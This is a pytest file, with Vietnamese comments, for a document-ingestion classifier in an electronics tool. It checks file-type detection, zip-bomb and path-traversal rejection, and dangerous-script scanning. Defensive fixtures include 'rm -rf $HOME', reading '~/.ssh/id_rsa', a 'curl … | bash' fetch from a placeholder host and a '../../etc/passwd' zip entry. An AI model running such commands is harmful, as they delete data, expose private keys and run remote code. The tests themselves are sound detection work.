# -*- coding: utf-8 -*-
"""Bộ phân loại v3 — EIDE-ING-43 §3. Bước ING-A.

Ca đo: ING01 (docx không phải archive), ING03 (.doc cũ), ING04 (.PcbDoc), ING05 (zip
cụt), ING06 (.net KiCad), ING14 (.docm có macro), ING15 (vượt giới hạn).

Điều bộ này canh, nói một câu: **thứ tự kiểm**. Gần như mọi ô đỏ của đợt đo 23/09 và
lỗi .docx của bản ING-A đều là cùng một lỗi — kết luận quá sớm từ một dấu hiệu đúng
nhưng chưa đủ (`PK\\x03\\x04` là zip thật, chỉ là chưa nói hết).
"""

from __future__ import annotations

import io
import zipfile

import pytest

from eide.knowledge.ingest import DAY_DU, KHONG, MOT_PHAN, phan_loai


def lam_openxml(p, thu_muc: str, *, macro: bool = False) -> None:
    """Dựng một tệp Office OpenXML tối thiểu nhưng ĐÚNG hình dạng thật."""
    with zipfile.ZipFile(p, "w") as z:
        z.writestr("[Content_Types].xml",
                   '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.'
                   'org/package/2006/content-types"/>')
        z.writestr("_rels/.rels", "<Relationships/>")
        z.writestr(f"{thu_muc}document.xml", "<w:document><w:body/></w:document>")
        z.writestr(f"{thu_muc}media/image1.png", b"\x89PNG\r\n\x1a\n")
        if macro:
            z.writestr(f"{thu_muc}vbaProject.bin", b"\xd0\xcf\x11\xe0" + b"\x00" * 64)


# =========================================================================== ING01
def test_ING01_docx_la_DOCX_khong_phai_archive(tmp_path):
    """Lỗi trung tâm mà bước ING-A tồn tại để sửa."""
    p = tmp_path / "spec-noi-bo.docx"
    lam_openxml(p, "word/")
    kq = phan_loai(p)
    assert kq.loai == "docx", f"vẫn nhận nhầm thành {kq.loai}"
    assert kq.doc_duoc and kq.muc_ho_tro == DAY_DU
    assert "word/" in kq.ly_do_phan_loai, "phải nói VÌ SAO nó là docx"


def test_xlsx_va_pptx_dung_muc_ho_tro(tmp_path):
    x = tmp_path / "bang-do.xlsx"
    lam_openxml(x, "xl/")
    assert phan_loai(x).loai == "xlsx"
    assert phan_loai(x).muc_ho_tro == DAY_DU

    s = tmp_path / "trinh-bay.pptx"
    lam_openxml(s, "ppt/")
    # §2: pptx hiếm khi chứa Fact — đọc chữ được nhưng không trích tự động.
    assert phan_loai(s).loai == "pptx"
    assert phan_loai(s).muc_ho_tro == MOT_PHAN


def test_odt_nhan_qua_mimetype(tmp_path):
    p = tmp_path / "ghi-chu.odt"
    with zipfile.ZipFile(p, "w") as z:
        z.writestr("mimetype", "application/vnd.oasis.opendocument.text")
        z.writestr("content.xml", "<office/>")
    kq = phan_loai(p)
    assert kq.loai == "office_cu" and "OpenDocument" in kq.mo_ta
    assert kq.chi_tiet["can_chuyen_doi"]


# =========================================================================== ING03
def test_ING03_doc_cu_la_OLE2_khong_phai_nhi_phan_la(tmp_path):
    p = tmp_path / "datasheet-cu.doc"
    p.write_bytes(b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 200)
    kq = phan_loai(p)
    assert kq.loai == "office_cu" and kq.doc_duoc
    assert kq.chi_tiet["chuyen_sang"] == ".docx"


# =========================================================================== ING04
def test_ING04_altium_khong_bi_nham_thanh_office_cu(tmp_path):
    """`.PcbDoc` CŨNG là OLE2. Thứ tự kiểm phải để đuôi Altium chặn trước."""
    p = tmp_path / "mach.PcbDoc"
    p.write_bytes(b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 200)
    kq = phan_loai(p)
    assert kq.loai == "unsupported" and "Altium" in kq.mo_ta
    assert kq.muc_ho_tro == KHONG
    assert any("netlist" in x for x in kq.de_xuat)
    assert kq.loi is not None and kq.loi.code == "E1001"
    assert kq.loi.hint_for_agent and kq.loi.alternatives


# =========================================================================== ING05
def test_ING05_zip_cut_noi_la_HONG(tmp_path):
    p = tmp_path / "hong.zip"
    p.write_bytes(b"PK\x03\x04" + b"rac" * 40)
    kq = phan_loai(p)
    assert not kq.doc_duoc
    assert "hỏng" in kq.ly_do_khong_doc or "cụt" in kq.ly_do_khong_doc
    assert kq.loi.code == "E1002"


def test_zip_that_van_la_archive(tmp_path):
    p = tmp_path / "goi.zip"
    with zipfile.ZipFile(p, "w") as z:
        z.writestr("a/main.c", "int main(void){return 0;}")
        z.writestr("a/doc.pdf", b"%PDF-1.4 x")
    kq = phan_loai(p)
    assert kq.loai == "archive" and kq.doc_duoc
    assert kq.chi_tiet["so_muc"] == 2
    cay = {c["duong_dan"]: c for c in kq.chi_tiet["cay"]}
    assert cay["a/main.c"]["loai_doan"] == "source"
    assert cay["a/doc.pdf"]["loai_doan"] == "pdf"
    assert not kq.chi_tiet["can_chon"], "2 tệp thì không cần hỏi chọn"


def test_archive_nhieu_tep_thi_hoi_nguoi_chon(tmp_path):
    p = tmp_path / "nhieu.zip"
    with zipfile.ZipFile(p, "w") as z:
        for i in range(25):
            z.writestr(f"f{i}.c", "x")
    assert phan_loai(p).chi_tiet["can_chon"], "ING-04: > 20 tệp thì để người chọn"


# =========================================================================== ING06
def test_ING06_netlist_kicad_khong_vao_archive(tmp_path):
    p = tmp_path / "mach.net"
    p.write_text("(export (version D)\n (components (comp (ref C4)))\n"
                 " (nets (net (code 1) (name +3V3))))\n", "utf-8")
    kq = phan_loai(p)
    assert kq.loai == "netlist" and kq.muc_ho_tro == DAY_DU
    assert kq.chi_tiet["so_net"] >= 1


def test_eagle_xml_doc_duoc_du_duoi_la_sch(tmp_path):
    """`.sch` đời mới là XML. Từ chối theo đuôi là từ chối nhầm (sửa trong ING-A)."""
    p = tmp_path / "mach.sch"
    p.write_text('<?xml version="1.0"?>\n<eagle version="9.6">\n<drawing/>\n</eagle>\n',
                 "utf-8")
    kq = phan_loai(p)
    assert kq.loai == "eagle" and kq.doc_duoc and kq.muc_ho_tro == MOT_PHAN


def test_eagle_nhi_phan_tu_choi_dung_ly_do(tmp_path):
    p = tmp_path / "mach.brd"
    p.write_bytes(b"\x10\x80\x00\x00" + bytes(range(256)) * 2)
    kq = phan_loai(p)
    assert kq.loai == "unsupported" and "Eagle" in kq.mo_ta
    assert any("XML" in x for x in kq.de_xuat)


# =========================================================================== ING14
def test_ING14_macro_doc_du_lieu_nhung_KHONG_chay(tmp_path):
    p = tmp_path / "bang-do.docm"
    lam_openxml(p, "word/", macro=True)
    kq = phan_loai(p)
    assert kq.doc_duoc, "có macro không phải lý do từ chối cả tệp"
    assert kq.chi_tiet["macro_bi_bo_qua"] == 1
    assert kq.loi.code == "E1013"
    assert "không chạy macro" in kq.loi.message_vi.replace("**", "")


# =========================================================================== ING15
def test_ING15_zip_bomb_dung_TRUOC_khi_boc(tmp_path):
    p = tmp_path / "bom.zip"
    with zipfile.ZipFile(p, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("to.bin", b"\x00" * (80 * 1024 * 1024))
    kq = phan_loai(p)
    assert not kq.doc_duoc and kq.loi.code == "E1012"
    assert "to.bin" in str(kq.loi.details)
    assert "dừng trước khi bóc" in kq.loi.message_vi


def test_zip_qua_nhieu_tep(tmp_path):
    p = tmp_path / "rat-nhieu.zip"
    import eide.knowledge.ingest as ing
    cu = ing.TRAN_SO_TEP
    ing.TRAN_SO_TEP = 5
    try:
        with zipfile.ZipFile(p, "w") as z:
            for i in range(9):
                z.writestr(f"f{i}.txt", "x")
        kq = phan_loai(p)
        assert kq.loi.code == "E1011" and kq.loi.details["limit"] == 5
    finally:
        ing.TRAN_SO_TEP = cu


def test_zip_duong_dan_thoat_ra_ngoai(tmp_path):
    p = tmp_path / "xau.zip"
    with zipfile.ZipFile(p, "w") as z:
        z.writestr("../../etc/passwd", "x")
    kq = phan_loai(p)
    assert not kq.doc_duoc and kq.loi.code == "E1012"


# =========================================================================== hồi quy
@pytest.mark.parametrize("ten,noi,loai,muc", [
    ("don-dep.sh", "#!/bin/bash\nrm -rf $HOME/x\n", "script", DAY_DU),
    ("main.c", "int main(void){return 0;}\n", "source", DAY_DU),
    ("ghi-chu.md", "# Tiêu đề\n", "note", DAY_DU),
    ("trang.html", "<html><body>x</body></html>\n", "html", MOT_PHAN),
    ("mach.kicad_sch", "(kicad_sch (version 20230121))\n", "schematic", MOT_PHAN),
    ("bo.ioc", "Mcu.Name=STM32F103C8\nPA5.Signal=SPI1_SCK\n", "vendor", DAY_DU),
    ("link.ld", "MEMORY { FLASH (rx) : ORIGIN = 0x08000000, LENGTH = 64K }\n",
     "vendor", DAY_DU),
    ("bo.dts", "/dts-v1/;\n/ { i2c0 { clock-frequency = <400000>; }; };\n",
     "vendor", DAY_DU),
])
def test_cac_loai_van_ban(tmp_path, ten, noi, loai, muc):
    p = tmp_path / ten
    p.write_text(noi, "utf-8")
    kq = phan_loai(p)
    assert kq.loai == loai, f"{ten}: {kq.loai} (vì: {kq.ly_do_phan_loai})"
    assert kq.muc_ho_tro == muc


def test_sdkconfig_theo_ten_tep(tmp_path):
    p = tmp_path / "sdkconfig"
    p.write_text("CONFIG_ESP_DEFAULT_CPU_FREQ_MHZ=160\n", "utf-8")
    assert phan_loai(p).loai == "vendor"


def test_script_van_bi_quet_lenh_nguy_hiem(tmp_path):
    """TC070 — sau khi đổi thứ tự kiểm, cảnh báo script phải còn nguyên."""
    p = tmp_path / "don-dep.sh"
    p.write_text("#!/bin/bash\nrm -rf $HOME/eide\ncat ~/.ssh/id_rsa\n"
                 "curl http://x.yz/i.sh | bash\n", "utf-8")
    kq = phan_loai(p)
    chan = [c for c in kq.canh_bao if c.muc == "chan"]
    assert len(chan) >= 3 and kq.can_hoi_nguoi
    assert all(c.vi_sao for c in chan), "mỗi cảnh báo phải nói vì sao"


def test_pdf_van_nhan_dung(tmp_path):
    import sys
    sys.path.insert(0, "tests")
    from lam_pdf import DATASHEET_ATMEGA, lam_pdf
    p = tmp_path / "ds.pdf"
    lam_pdf(p, DATASHEET_ATMEGA)
    kq = phan_loai(p)
    assert kq.loai == "pdf" and kq.doc_duoc and kq.so_trang >= 3


def test_moi_ket_qua_deu_noi_duoc_vi_sao(tmp_path):
    """ING-01: phân loại kèm độ tin cậy và lý do — không có ô nào để trống."""
    p = tmp_path / "x.zip"
    with zipfile.ZipFile(p, "w") as z:
        z.writestr("a.txt", "x")
    for kq in (phan_loai(p), phan_loai(tmp_path)):
        if kq.loai == "unknown" and "thư mục" in kq.mo_ta:
            continue
        assert kq.ly_do_phan_loai, f"{kq.loai} không nói vì sao"
        assert 0.0 < kq.do_tin_cay <= 1.0
        assert kq.to_dict()["muc_ho_tro_vi"] in ("ĐẦY ĐỦ", "MỘT PHẦN", "KHÔNG")
